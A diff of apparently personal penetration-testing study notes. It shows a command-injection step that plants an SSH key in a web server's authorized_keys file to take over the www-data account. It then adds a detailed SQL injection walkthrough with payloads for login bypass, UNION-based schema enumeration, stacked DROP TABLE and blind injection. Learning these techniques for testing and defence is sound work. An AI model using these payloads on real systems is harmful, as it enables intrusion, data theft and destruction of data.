@@ -77,12 +77,154 @@ Upload copy of SSH RSA token to that home directory:
 ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
 mkdir /var/www/.ssh
 ON CMD:
-ls -la ../../.sh/
-ssh-keygen -t rsa -b 4096 (to find keys in the first place)
+ls -la ../../.ssh/
+ssh-keygen -t rsa -b 4096 (to generate keys in the first place)
 cat ../../.ssh/id_rsa.pub (public - copy everything in this file)
 cat ../../.ssh/id_rsa (private)
 IN INJECTION SPOT:
-;echo open "[PASTE]" >> /var/www/.ssh/authorized_keys
+;echo "[PASTE]" >> /var/www/.ssh/authorized_keys
 ON CMD: ssh www-data@(target IP) (hijacks this user account on the target)
+
+
+Section 5: SQL
+
+THE GOLDEN STATEMENT: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+        - This extracts those 3 crucial pieces of information from the "columns" table within the all-knowing schema (each of these 3 is a column within the "columns" table)
+        - TABLE_SCHEMA: Names of all the databases across the entire server
+        - TABLE_NAME: Names of all the tables across the entire server
+        - COLUMN_NAME: Names of all the columns across the entire server
+Golden Statement Process:
+        > mysql (actually gets us into the sql server)
+        > show databases ; (prints all databases; usually 3 databases by default are information_schema, mysql, performance_scheme)
+        > use information_schema ; (reads database info)
+        > show tables from information_schema ; (shows all the tables in the database)
+                - Very important tables: COLUMNS
+        > show columns from columns ; (because there is a column called "columns" within the table called "columns")
+        > SELECT table_schema FROM information_schema.columns ; (shows the whole table_schema column from the "columns" table)
+                - Important thing about SQL: Due to the relational nature of SQL, there will be many, many duplicates of schema names in this output: one for each table the schema includes.)
+        > SELECT table_name FROM information_schema.columns ; 
+                - Shows all the tables in the server, you need to have table_schema and table_name output together to see which tables belong to which database)
+        > SELECT column_name FROM information_schema.columns ;
+                - Shows all the columns in the server, this is the only field that has no duplicate entries since this is the most granular the results get)
+        > UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+                - This will let you actually see the whole picture
+Attack Steps: (POST)
+        1. Identify vulnerable field
+                - Throw the exploit for each valid entry (Audi ' OR 1='1)
+                - If the query thrown has a \ that you didn't put in there, it automatically escapes single quotes and is not vulnerable)
+        2. Identify number of columns
+                - Throw a union select (Audi' UNION SELECT 1,2,3,4 #) up to the number of columns you see. "Show query" should show if there are any additional columns
+                - Throw the same command but up to 5 columns (if show query showed 5 columns) to test that it worked
+        3. Input golden statement, updated to reflect newly known number of columns.
+                - If the form expects 5 columns, just add a ",4,5" after the 3 tables in the golden rule (this is junk placeholder - just makes the form happy)
+                - Throw this: UNION SELECT table_schema,table_name,column_name,4,5 FROM information_schema.columns
+                - Say that the form for some reason refuses to display column 2: instead run this:
+                        - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
+                        - this will put a placeholder in the 2nd column (which is then not displayed) instead of something you actually want to see
+Attack Steps (GET)
+        1. Utilize dropdown, show query for each one
+                - Note how many columns are shown and queried for
+        2. Identify vulnerable field
+                - In the URL, after "<selection>=", type "4 OR 1=1"
+                - Instead of "4", try 1, or 2, or 3, etc; as many numbers as there are columns
+        3. Union select
+                - Run "selection=3 UNION SELECT 1,2,3,4"
+                - Run the same thing up to 5 just to see if there's an extra hidden field (if not, there will be an error message)
+                - Now we know how many fields the form expects - only 4, not extra hidden field
+        4. Input golden statement
+                - Throw this: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+                - (may be out of order, but whatever. You can just rearrange the order you throw the tables in the statement if you're OCD)
+Standard SQL Commands:
+        - SELECT: Extracts data from a database (key)
+                - Syntax: select movies including the string below
+                        SELECT * FROM movies
+                        WHERE Title LIKE "%Toy Story%"
+        - UNION: Used to COMBINE the result of TWO OR MORE select statements (key)
+                - UNION SELECT
+        - USE: Selects the DB to use
+        - UPDATE: Updates data in a database
+        - DELETE: Deletes data from a database
+        - INSERT INTO: Inserts new data into a database
+        - CREATE DATABASE: Creates a new database
+        - ALTER DATABASE: Modifies a database
+        - CREATE TABLE: Creates a new table
+        - ALTER TABLE: Modifies a table
+        - DROP TABLE: Deletes a table
+        - CREATE INDEX: Creates an index (search key)
+        - DROP INDEX: Deletes an index
+Links:
+        - Syntax: https://www.w3schools.com/SQL/sql_syntax.asp
+        - Tutorials: https://sqlbolt.com/
+SQL Injection considerations:
+        - Requires Valid SQL Queries
+        - Fully patched systems CAN BE vulnerable due to misconfiguration
+        - Input Field Sanitization
+        - String vs Integer values
+        - Is INFORMATION_SCHEMA database available? (contains all the tables, column names, etc. - very useful)
+        - GET request vs POST request HTTP methods
+Unsanitized vs Sanitized Fields:
+        - Unsanitized: input fields can be found using a Single Quote ⇒ '
+                - Will return extraneous information
+                - ' closes a variable, to allow for additional statements/clauses
+                - May show no errors or generic error (harder Injection)
+        - Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+        - Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
+Server-Side Query Processing
+        - Say that user enters JohnDoe243 in the name form field and pass1234 in the pass form field...
+        - The Server-Side Query that would be passed to MySQL from PHP would be:
+                - Before input: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+                - After input: SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
+Statement Injection Example: (BYPASSING CREDENTIALS - POST)
+        - Say that user enters: tom' OR 1='1 (in the name and pass fields)
+                - Truth Statement: tom' OR 1='1
+        - Server-Side query executed would appear like this:
+                - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+Statement Injection (GET):
+        - Type in the POST statement injection into the fields but do not submit
+        - Inspect page (F12), go to Network tab
+        - Submit form, grab the info on the POST request, click on Request tab on the right, click on Raw option
+                - add "?" to the end of the url, then copy-paste the result after that ?
+        - This should get you the array of valid SQL queries
+Stacking Statements:
+        - You can add in whatever statements you want by utilizing a semi-colon ;
+        - User input: Johnny'; DROP TABLE Customers; --
+        - Server side: SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+Nesting Statements:
+        - Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+        - Though they may allow for nesting a statement within an existing one:
+        - Key User Input: UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+        - URL: php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+Messing with SQL
+        - Using # or -- tells the Database to ignore everything after
+        - User input: 1 or 1=1; #
+        - Server Side: SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+                - Now you have unlimited tries!
+Blind Injection:
+        - Includes Statements to determine how DB is configured. Essential questions:
+                - Columns in output?
+                - Can we return errors?
+                - Can we return expected output?
+        - Used when unsanitized fields give generic error or no messages
+        - Normal Query to pull expected output: php?item=4
+        - Blind injection for validation: php?item=4 OR 1=1
+        - Try ALL combinations! item=1, item=2, item=3, etc.
+Abusing the Client! (GET)
+        - Pass the injection through the URL: After the .php?item=4 pass your UNION statement
+        - Key User Input: UNION SELECT 1,2,@@version
+        - URL: prices.php?item=4 UNION SELECT 1,2,@@version
+                - the @@version just queries for the SQL version
+Abusing the Client! (enum)
+        - Identifying the schema leads to detailed queries to enumerate the DB
+                - Research Database Schemas and what information they provide 
+        - Key User Input: UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+        - URL: php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+Defend!
+        - Validate inputs!! Methods differ by software
+        - CONCATENATE: turns inputs into single strings or escape characters (messes with the injection process a little)
+                - PHP: mysql_real_escape_string
+                - SQL: sqlite3_prepare()
+
+
+
 
 
